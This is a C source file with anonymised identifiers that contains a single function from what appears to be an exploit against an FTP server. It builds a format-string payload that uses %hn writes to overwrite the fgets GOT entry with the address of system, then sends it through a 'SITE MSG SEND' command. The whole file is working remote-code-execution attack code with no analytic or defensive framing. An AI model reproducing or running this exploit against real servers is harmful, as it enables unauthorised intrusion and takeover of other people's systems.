
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int writecode ;
typedef int tmp ;
struct TYPE_2__ {int system; int fgetsgot; } ;


 int FUNC_0 (char*,int,char*) ;
 int FUNC_1 (char*,int,char*,...) ;
 int FUNC_2 (char*,char*) ;
 int FUNC_3 (char*,char*) ;
 int FUNC_4 (char*) ;
 TYPE_1__* VAR_0 ;
 int FUNC_5 (int,char*,int) ;

int FUNC_6(int VAR_1, char *VAR_2, int VAR_3, char *VAR_4) {
int VAR_5;
char VAR_6[4096], VAR_7[68], VAR_8[68];
unsigned short VAR_9, VAR_10, VAR_11, VAR_12;
int VAR_13, VAR_14;

VAR_9 = VAR_0[VAR_3].system >> 16 & 0xFFFF;
VAR_10 = VAR_0[VAR_3].system & 0xFFFF;

if (VAR_9 > VAR_10) {
VAR_11 = VAR_10;
VAR_12 = VAR_9;
VAR_13 = VAR_0[VAR_3].fgetsgot;
VAR_14 = VAR_0[VAR_3].fgetsgot + 2;
} else {
VAR_11 = VAR_9;
VAR_12 = VAR_10;
VAR_13 = VAR_0[VAR_3].fgetsgot + 2;
VAR_14 = VAR_0[VAR_3].fgetsgot;
}

if (VAR_4) {
FUNC_3(VAR_7, VAR_4);
}
if (FUNC_4(VAR_7) < 32) {
do {
FUNC_2(VAR_7, "_");
} while (FUNC_4(VAR_7) < 32);
}
VAR_11 -= (FUNC_4(VAR_7) + 16);
FUNC_1(VAR_8, sizeof(VAR_8),
"%c%c%c%c%c%c%c%c%%%du%%18$hn%%%du%%19$hn",
VAR_13 & 0xFF, (VAR_13 >> 8) & 0xFF, (VAR_13 >> 16) & 0xFF, (VAR_13 >> 24) & 0xFF,
VAR_14 & 0xFF, (VAR_14 >> 8) & 0xFF, (VAR_14 >> 16) & 0xFF, (VAR_14 >> 24) & 0xFF,
VAR_11, VAR_12 - VAR_11 - 0x30);
FUNC_1(VAR_6, sizeof(VAR_6), "SITE MSG SEND %s %s%s\n", VAR_2, VAR_7, VAR_8);
FUNC_0("[*] len: %d, sending code [%s]\n", FUNC_4(VAR_7) + FUNC_4(VAR_8), VAR_6);
return FUNC_5(VAR_1, VAR_6, FUNC_4(VAR_6));
}
